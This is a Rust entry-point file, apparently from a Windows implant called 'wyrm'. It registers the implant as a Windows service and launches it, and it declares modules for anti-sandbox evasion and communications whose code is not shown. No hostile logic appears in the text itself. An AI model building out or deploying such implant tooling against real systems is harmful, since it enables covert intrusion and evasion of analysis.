#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

use std::sync::atomic::Ordering;

use entry::start_wyrm;
use windows_sys::{
    Win32::System::Services::{RegisterServiceCtrlHandlerW, SERVICE_CONTROL_STOP, SERVICE_RUNNING},
    core::PWSTR,
    w,
};

use crate::{
    entry::IS_IMPLANT_SVC,
    utils::svc_controls::{SERVICE_HANDLE, SERVICE_STOP_EVENT, update_service_status},
};

mod anti_sandbox;
mod comms;
mod entry;
mod native;
mod utils;
mod wyrm;

#[unsafe(no_mangle)]
pub unsafe extern "system" fn ServiceMain(_: u32, _: *mut PWSTR) {
    // register the service with SCM (service control manager)
    let h_svc = unsafe { RegisterServiceCtrlHandlerW(w!("MyService"), Some(service_handler)) };
    if h_svc.is_null() {
        panic!()
    }

    unsafe { update_service_status(h_svc, SERVICE_RUNNING) }

    IS_IMPLANT_SVC.store(true, Ordering::SeqCst);
    SERVICE_HANDLE.store(h_svc, Ordering::SeqCst);

    start_wyrm();
}

unsafe extern "system" fn service_handler(control: u32) {
    match control {
        SERVICE_CONTROL_STOP => {
            SERVICE_STOP_EVENT.store(true, Ordering::SeqCst);
        }
        _ => {}
    }
}

fn main() {
    start_wyrm();
}
